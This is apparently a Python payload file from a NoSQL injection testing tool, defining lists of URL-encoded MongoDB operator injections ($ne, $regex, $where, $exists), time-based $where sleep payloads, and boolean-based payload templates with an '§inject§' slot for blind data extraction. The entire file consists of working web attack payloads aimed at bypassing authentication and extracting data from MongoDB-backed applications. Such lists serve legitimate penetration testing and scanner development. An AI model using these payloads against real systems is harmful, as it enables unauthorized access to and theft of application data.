array_payloads=[    
    "%5b%24eq%5d=1",
    "%5b%24ne%5d=1",
    "%5b%24lt%5d=",
    "%5b%24gt%5d=",
    "%5b%24exists%5d=false",
    "%5b%24exists%5d=true",
    "%5b%24regex%5d=.%5e",
    "%5b%24regex%5d=.*",
    "%5b%24where5d=return%20false",
    "%5b%24where5d=return%20true",
    "%5b%24%5d=1",
    "%5b%24where%5d=1",
    "%5b%24regex%5d=*",
    "%5b%24regex%5d=null",
    "%5b%24exists%5d=null",
    "%5b%24a%5d=null",
    "%5b%26eq%5d=1",
    "%5b%26ne%5d=1",
    "%5b%26lt%5d=",
    "%5b%26gt%5d=",
    "%5b%26exists%5d=false",
    "%5b%26exists%5d=true",
    "%5b%26regex%5d=.%5e",
    "%5b%26regex%5d=.*",
    "%5b%26where5d=return%20false",
    "%5b%26where5d=return%20true",
    "%5b%26%5d=1",
    "%5b%26where%5d=1",
    "%5b%26regex%5d=*",
    "%5b%26regex%5d=null",
    "%5b%26exists%5d=null",
    "%5b%26a%5d=null",
    "%5b%5d=_security",
    "%5b%26eq%5d=1",
    "%5b%26ne%5d=1"
]

time_payloads=[
    "{\"$where\":\"sleep(1)\"}",
    "{\"&where\":\"sleep(1)\"}",
    "$where:\"sleep(1)\"",
    "$where:'sleep(1)'",
    "sleep(1)",
    "a;sleep(1)",
    "'a';sleep(1)",
    "a';sleep(1);var xyz='a",
    "';sleep(1);var xyz='0",
    "\\';sleep(1);var xyz='0"
    ]

bool_payloads = [
    ["'", None],
    ["\\'", None],
    ["||1==1","||(§inject§)"],
    ["'||'a'=='a", None],
    ["'||'a'=='a", None],
    ["\\'||'a'=='a", None],
    ["\\\'||'a'=='a", None],
    ["true,$where:'1==1'","true,$where:'(§inject§)'"],
    [",$where:'1==1'",",$where:'§inject§'"],
    ["$where:'1==1'","$where:'§inject§'"],
    ["',$where:'1==1", "',$where:'§inject§"],
    ["1,$where:'1==1'", "1,$where:'§inject§'"],
    ["';return 'a'=='a' && ''=='", "';return (§inject§) && ''=='"],    
    ["\\';return 'a'=='a' && ''=='", "\\';return §inject§ && ''=='"],
    ["\\\';return 'a'=='a' && ''=='", "\\\';return §inject§ && ''=='"],
    ["\";return 'a'=='a' && ''=='","\";return §inject§ && ''=='"],
    ["\\\";return 'a'=='a' && ''=='", "\\\";return §inject§ && ''=='"],
    ["\";return(true);var xyz='a", "\";return(§inject§);var xyz='a"],
    ["';return(true);var xyz='a","';return(§inject§);var xyz='a"],
    ["\\';return(true);var xyz='a", "\\';return(§inject§);var xyz='a"],
    ["a';return true;var xyz='a", "a';return §inject§;var xyz='a"],
    ["a\\';return true;var xyz='a", "a\\';return §inject§;var xyz='a"],
    ["a\";return true;var xyz=\"a", "a\";return §inject§;var xyz=\"a"], #only extraction tested
    ["0;return true", "0;return §inject§"],
    #"require('os').endianness()=='LE'",
    # "var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz=1",
    # "1;var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz=1",
    # "1';var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz='1",
    # "1\\';var d=new Date();do{var cd=new Date();}while(cd-d<1);var xyz='1",
    #"_security",
]